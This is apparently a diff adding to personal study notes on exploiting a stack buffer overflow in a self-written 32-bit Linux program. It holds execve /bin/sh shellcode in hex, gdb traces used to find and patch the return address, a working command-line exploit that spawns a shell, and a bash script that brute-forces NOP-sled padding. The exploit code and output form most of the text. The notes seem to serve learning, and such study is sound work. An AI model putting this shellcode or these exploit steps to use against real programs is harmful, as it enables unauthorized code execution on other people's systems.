@@ -1056,7 +1056,7 @@ in hexdump so I print a Y and replace it with \ afterwards.
 
 # To see you are in right location.
 # $ hexdump -s 0x110 -v -e'/1 "Y0x%02x"' testya3.o  > foo.txt
-$ hexdump -s 0x110 -v -e'/1 "Yx02x"' testya3.o  > foo.txt
+$ hexdump -s 0x110 -v -e'/1 "Yx%02x"' testya3.o  > foo.txt
 $ sed -i 's/Y/\\/g'  foo.txt
 
 Then I edit with vim to find the first 0x00 after the null term string for s.
@@ -1070,6 +1070,309 @@ Ditto for the markers.  You can touch it up if you wish.
 
 Using this approach on the original problem where we are doing a strcpy.
 ----------------------------------------------------------------------------
+
+The example code uses a smaller buffer, so my first worry is that the code will not fit in the buffer.  However, we could use aleph ones approach where we copy our shell code into the users environment and have our shell code access that.  However, I'm going to just adjust based upon the stack to pad until we find
+the return address and exploit it like the secret function demo.
+
+First thing to do is copy the buffer and strip off the leading parts for the model used by the testy1.c program.
+
+
+
+\xeb\x1d\x5c\x89\xe3\x83\xc4\x08\x89\x1c\x24\x89\xe1\x89\xc8\x83\xc0\x04\x31\xd2\x89\x10\x31\xc0\x89\xc2\x83\xc0\x0b\xcd\x80\xe8\xde\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00
+
+
+
+As expected this crashes since we have overwritten the return address.  (We only had 10 bytes of space for the shell code.  Well, no worries we patch it.
+
+(gdb) step
+vulnerable (
+    arg=0xbffff8a7 "\353\035\\\211\343\203\304\b\211\034$\211\341\211␉\300\004\0
+61҉\020\061\300\211\302\203\300\v̀\350\336\377\377\377/bin/sh")
+    at buffer_overflow.c:12
+(gdb) layout next
+(gdb) stepi
+0x080481b0 in ?? ()
+(gdb) finish
+Run till exit from #0  0x080481b0 in ?? ()
+
+Program received signal SIGSEGV, Segmentation fault.
+0xc289c031 in ?? ()
+Cannot access memory at address 0xc289c031
+
+
+
+So, lets look at the objdump
+
+00000000 <initialStart>:
+   0:   eb 1d                   jmp    1f <theCall>
+
+00000002 <theKracken>:
+   2:   5c                      pop    %esp
+   3:   89 e3                   mov    %esp,%ebx
+   5:   83 c4 08                add    $0x8,%esp
+   8:   89 1c 24                mov    %ebx,(%esp)
+   b:   89 e1                   mov    %esp,%ecx
+   d:   89 c8                   mov    %ecx,%eax
+   f:   83 c0 04                add    $0x4,%eax
+  12:   31 d2                   xor    %edx,%edx
+
+<-- We are trying to interpet the next two instructions 
+    as an address for use as a resume address.
+
+  14:   89 10                   mov    %edx,(%eax)
+  16:   31 c0                   xor    %eax,%eax
+  18:   89 c2                   mov    %eax,%edx
+  1a:   83 c0 0b                add    $0xb,%eax
+  1d:   cd 80                   int    $0x80
+
+0000001f <theCall>:
+  1f:   e8 de ff ff ff          call   2 <theKracken>
+
+00000024 <execvCmdString>:
+  24:   2f                      das    
+  25:   62 69 6e                bound  %ebp,0x6e(%ecx)
+  28:   2f                      das    
+  29:   73 68                   jae    93 <execvCmdString+0x6f>
+        ...
+
+It does this when it executes the ret instruction as part of the end of
+the vulnerable code.  Run it up in gdb and determine address we are 
+using at this point. Prior to executing ret,
+
+(gdb) x/4xw $esp
+0xbffff6ac:     0xc289c031      0xcd0bc083      0xffdee880      0x622fffff
+
+So we know our code is in memory, but where is the start of it?
+
+(gdb) x/4xw $esp-24
+0xbffff694:     0x1debf760      0x83e3895c      0x1c8908c4      0x89e18924
+
+There is our eb 1d. Followed by 5c 89, ...
+
+(gdb) disas 0xbffff696, +22
+   |0xbffff696      jmp    0xbffff6b5                                          │
+   │0xbffff698      pop    %esp                                                │
+   │0xbffff699      mov    %esp,%ebx                                           │
+   │0xbffff69b      add    $0x8,%esp                                           │
+   │0xbffff69e      mov    %ebx,(%esp)                                         │
+   │0xbffff6a1      mov    %esp,%ecx                                           │
+   │0xbffff6a3      mov    %ecx,%eax                                           │
+   │0xbffff6a5      add    $0x4,%eax                                           │
+   │0xbffff6a8      xor    %edx,%edx                                           │
+   │0xbffff6aa      mov    %edx,(%eax)                                         │
+   │0xbffff6ac      xor    %eax,%eax                                           │
+   │0xbffff6ae      mov    %eax,%edx                                           │
+   │0xbffff6b0      add    $0xb,%eax                                           │
+   │0xbffff6b3      int    $0x80                                               │
+   │0xbffff6b5      call   0xbffff698   
+
+So, just patch the assembly file.
+
+[davis@yoshi progs]$ vi testya4.asm 
+[davis@yoshi progs]$ make testya4.o
+nasm -felf testya4.asm
+[davis@yoshi progs]$ hexdump -s 0x110 -v -e'/1 "Yx%02x"' testya4.o  > foo.txt
+[davis@yoshi progs]$ sed -i 's/Y/\\/g'  foo.txt
+
+
+\xeb\x25\x5c\x89\xe3\x83\xc4\x08\x89\x1c\x24\x89\xe1\x89\xc8\x83\xc0\x04\x90\x90\xeb\x04\x86\xf6\xff\xbf\x31\xd2\x89\x10\x31\xc0\x89\xc2\x83\xc0\x0b\xcd\x80\xe8\xd6\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00
+
+So this will run in gdb.
+
+
+warning: Could not load shared library symbols for linux-gate.so.1.
+Do you need "set solib-search-path" or "set sysroot"?
+
+Breakpoint 1, 0x0805b861 in main ()
+(gdb) cont
+Continuing.
+sh-4.3$ ls
+Makefile           foo.o        patch.gdb   shell.o       testy1.c     testya2.o
+a.out              gdbit.sh     patch4.gdb  simpleprog    testy1.o     testya3.asm
+buffer_overflow    notes.txt    patch5.gdb  simpleprog.c  testy2.c     testya3.o
+buffer_overflow.c  notes1.txt   patch6.gdb  simpleprog.o  testya1.asm  withdebug.txt
+buffer_overflow.o  notes2.txt   runbin.sh   testy1        testya1.o    withoutall.txt
+foo                outfile.txt  shell.asm   testy1.asm    testya2.asm  withoutdebug.txt
+sh-4.3$ exit
+exit
+[Inferior 1 (process 542) exited normally]
+(gdb) quit
+[davis@vm-i386 progs]$ 
+
+But not when run at cmdline
+dmesg shows
+[16230.686348] buffer_overflow[590]: segfault at 4741f6c6 ip bffff688 sp bffff6e0 error 4
+
+
+Not unexpected.  When run under gdb control the ip address could be different.
+However, we are not stopped yet.  In previous days, you would get a coredump file in the directory when this happened however, now you don't.  So, do this
+
+[davis@vm-i386 progs]$ coredumpctl gdb
+
+(gdb) bt
+#0  0xbffff688 in ?? ()
+Backtrace stopped: Cannot access memory at address 0x4eb9094
+(gdb) 
+
+(gdb) print /x $esp
+$1 = 0xbffff6e0
+
+Dump of assembler code from 0xbffff6e0 to 0xbffff6f6:
+   0xbffff6e0:  xor    %edx,%edx
+   0xbffff6e2:  mov    %edx,(%eax)
+   0xbffff6e4:  xor    %eax,%eax
+   0xbffff6e6:  mov    %eax,%edx
+   0xbffff6e8:  add    $0xb,%eax
+   0xbffff6eb:  int    $0x80
+   0xbffff6ed:  call   0xbffff6c8
+
+That looks like our code
+
+but what is 0x4eb9094 and where did it come from?
+
+(gdb) x/4xw 0xbffff6d0     
+0xbffff6d0:     0x89e18924      0x04c083c8      0x04eb9090      0xbffff686
+
+Hmm. So our patch address is 686 but we are at 6d0.  
+(Actually, 6d0 not far enough.  Need to move up to the jump)
+
+(gdb) disas /r 0xbffff6c6, +22
+Dump of assembler code from 0xbffff6c6 to 0xbffff6dc:
+   0xbffff6c6:  eb 25   jmp    0xbffff6ed
+   0xbffff6c8:  5c      pop    %esp
+   0xbffff6c9:  89 e3   mov    %esp,%ebx
+   0xbffff6cb:  83 c4 08        add    $0x8,%esp
+   0xbffff6ce:  89 1c 24        mov    %ebx,(%esp)
+   0xbffff6d1:  89 e1   mov    %esp,%ecx  
+   0xbffff6d3:  89 c8   mov    %ecx,%eax 
+   0xbffff6d5:  83 c0 04        add    $0x4,%eax
+   0xbffff6d8:  90      nop
+   0xbffff6d9:  90      nop
+   0xbffff6da:  eb 04   jmp    0xbffff6e0
+End of assembler dump.
+
+686 becomes 6C6.  So, lets make that fix.
+Just yyGp from above and R
+
+\xeb\x25\x5c\x89\xe3\x83\xc4\x08\x89\x1c\x24\x89\xe1\x89\xc8\x83\xc0\x04\x90\x90\xeb\x04\xc6\xf6\xff\xbf\x31\xd2\x89\x10\x31\xc0\x89\xc2\x83\xc0\x0b\xcd\x80\xe8\xd6\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00
+
+And now, 
+
+[davis@vm-i386 progs]$ ./buffer_overflow `printf "\xeb\x25\x5c\x89\xe3\x83\xc4\x08\x89\x1c\x24\x89\xe1\x89\xc8\x83\xc0\x04\x90\x90\xeb\x04\xc6\xf6\xff\xbf\x31\xd2\x89\x10\x31\xc0\x89\xc2\x83\xc0\x0b\xcd\x80\xe8\xd6\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00"`
+sh-4.3$ ls
+Makefile           foo.o        patch.gdb   shell.o       testy1.c     testya2.o
+a.out              gdbit.sh     patch4.gdb  simpleprog    testy1.o     testya3.asm
+buffer_overflow    notes.txt    patch5.gdb  simpleprog.c  testy2.c     testya3.o
+buffer_overflow.c  notes1.txt   patch6.gdb  simpleprog.o  testya1.asm  withdebug.txt
+buffer_overflow.o  notes2.txt   runbin.sh   testy1        testya1.o    withoutall.txt
+foo                outfile.txt  shell.asm   testy1.asm    testya2.asm  withoutdebug.txt
+sh-4.3$ 
+
+
+
+Now for the easiest shell of all.  This uses buffer_overflow2.c which has a buffer big
+enough that out entire shell code will fit in the read buffer.  I've already added
+nops for a landing spot so we can "nop slide" to our code.
+
+$ make buffer_overflow2
+$ make testya5.asm
+$ hexdump -s 0x110 -v -e'/1 "Yx%02x"' testya5.o  > foo.txt
+$ sed -i 's/Y/\\/g'  foo.txt
+
+Once again just pulling out the portion until the first null.  This means that
+the buffer in the c program is 50 bytes and our shell code is 44 bytes.  The stack
+will have enough space for our shell code.  This means we will not land in the middle
+of our code, but this will not overflow the buffer.  We need to prepend enough nops so 
+that it pushes a nop slide into position for the return address to be overwritten.
+
+Use this script to determine the number of nops.
+
+[davis@vm-i386 progs]$ cat testy.sh
+#!/bin/bash
+
+SHELL_CODE="\xeb\x1d\x5c\x89\xe3\x83\xc4\x08\x89\x1c\x24\x89\xe1\x89\xc8\x83\xc0\x04\x31\xd2\x89\x10\x31\xc0\x89\xc2\x83\xc0\x0b\xcd\x80\xe8\xde\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00"
+
+PREFIX="\x90"
+
+i="0"
+while true; do
+        i=$[$i+1]
+        echo "attempt " $i
+        EXEC_LINE="./buffer_overflow2 `printf ${PREFIX}${SHELL_CODE}`"
+        ${EXEC_LINE}
+        PREFIX=${PREFIX}"\x90"
+done
+
+[davis@vm-i386 progs]$ 
+
+When run it looks like this
+
+[davis@vm-i386 progs]$ ./testy.sh 
+attempt  1
+argv[1] = ��\���$��ȃ�1҉1��
+                         ̀�����/bin/sh
+attempt  2
+argv[1] = ���\���$��ȃ�1҉1��
+                          ̀�����/bin/sh
+attempt  3
+argv[1] = ����\���$��ȃ�1҉1��
+                           ̀�����/bin/sh
+attempt  4
+argv[1] = �����\���$��ȃ�1҉1��
+                            ̀�����/bin/sh
+attempt  5
+argv[1] = ������\���$��ȃ�1҉1��
+                             ̀�����/bin/sh
+attempt  6
+argv[1] = �������\���$��ȃ�1҉1��
+                              ̀�����/bin/sh
+attempt  7
+argv[1] = ��������\���$��ȃ�1҉1��
+                               ̀�����/bin/sh
+attempt  8
+argv[1] = ���������\���$��ȃ�1҉1��
+                                ̀�����/bin/sh
+attempt  9
+argv[1] = ����������\���$��ȃ�1҉1��
+                                 ̀�����/bin/sh
+attempt  10
+argv[1] = �����������\���$��ȃ�1҉1��
+                                  ̀�����/bin/sh
+attempt  11
+argv[1] = ������������\���$��ȃ�1҉1��
+                                   ̀�����/bin/sh
+attempt  12
+argv[1] = �������������\���$��ȃ�1҉1��
+                                    ̀�����/bin/sh
+attempt  13
+argv[1] = ��������������\���$��ȃ�1҉1��
+                                     ̀�����/bin/sh
+attempt  14
+argv[1] = ���������������\���$��ȃ�1҉1��
+                                      ̀�����/bin/sh
+attempt  15
+argv[1] = ����������������\���$��ȃ�1҉1��
+                                       ̀�����/bin/sh
+sh-4.3$ 
+
+Then you can do 
+
+
+
+[davis@vm-i386 progs]$ ./buffer_overflow2 `printf "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x1d\x5c\x89\xe3\x83\xc4\x08\x89\x1c\x24\x89\xe1\x89\xc8\x83\xc0\x04\x31\xd2\x89\x10\x31\xc0\x89\xc2\x83\xc0\x0b\xcd\x80\xe8\xde\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00"`
+argv[1] = ����������������\���$��ȃ�1҉1��
+                                       ̀�����/bin/sh
+sh-4.3$ ls  
+Makefile            foo.tx       patch.gdb   simpleprog.c  testya1.o    testya5.o
+a.out               foo.txt      patch4.gdb  simpleprog.o  testya2.asm  withdebug.txt
+buffer_overflow.c   gdbit.sh     patch5.gdb  testy1        testya2.o    withoutall.txt
+buffer_overflow2    notes.txt    patch6.gdb  testy1.asm    testya3.asm  withoutdebug.txt
+buffer_overflow2.c  notes1.txt   runbin.sh   testy1.c      testya3.o
+buffer_overflow2.o  notes2.txt   shell.asm   testy1.o      testya4.asm
+foo                 out.txt      shell.o     testy2.c      testya4.o
+foo.o               outfile.txt  simpleprog  testya1.asm   testya5.asm
+sh-4.3$ 
+
 
 
 
